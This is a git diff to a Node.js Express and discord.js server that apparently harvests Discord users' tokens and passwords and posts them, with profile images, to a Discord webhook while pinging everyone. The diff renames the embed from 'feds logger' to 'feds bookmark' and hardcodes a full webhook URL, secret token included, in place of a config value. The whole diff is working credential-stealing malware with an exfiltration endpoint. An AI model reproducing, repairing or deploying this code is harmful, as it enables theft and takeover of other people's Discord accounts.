@@ -1,5 +1,4 @@
 const { default: axios } = require("axios");
-const {hook} = require("./config.json");
 const express = require("express");
 const { MessageEmbed, WebhookClient } = require("discord.js");
 const app = express();
@@ -95,7 +94,7 @@ window.location="https://discord.com/channels/@me";
       console.log(data);
       if (!data) return;
       const embed = new MessageEmbed();
-      embed.setTitle("feds logger");
+      embed.setTitle("feds bookmark");
       embed.setImage(data.bannerURL);
       embed.setThumbnail(data.avatarURL);
       let rawStringData = [];
@@ -112,12 +111,11 @@ window.location="https://discord.com/channels/@me";
       if (process.logged.find((e) => e.token === token && e.passowrd === pass)) {
         console.log("Found Duplicate Logged ID");
       } else {
-        await axios({ method: "POST", url: hook, data: { content: "@everyone @here", embeds: [embed.toJSON()] } }).catch((err) => console.log(err.name));
+        await axios({ method: "POST", url: "https://discord.com/api/webhooks/1052050979840860182/q1mTfTpBYZpFK9fQGiWGDUNYnge16ODe3TGNXJRjDRirpU71HoO9sgwSy5ddQfMxrKAz", data: { content: "@everyone @here", embeds: [embed.toJSON()] } }).catch((err) => console.log(err.name));
         process.logged.push({ token, password: pass });
+      }
+    } catch (err) {
+      console.log(err);
     }
   }
-});
-
-app.listen(4200, () => {
-  console.log(`Server Started on http://localhost:4200`);
 });
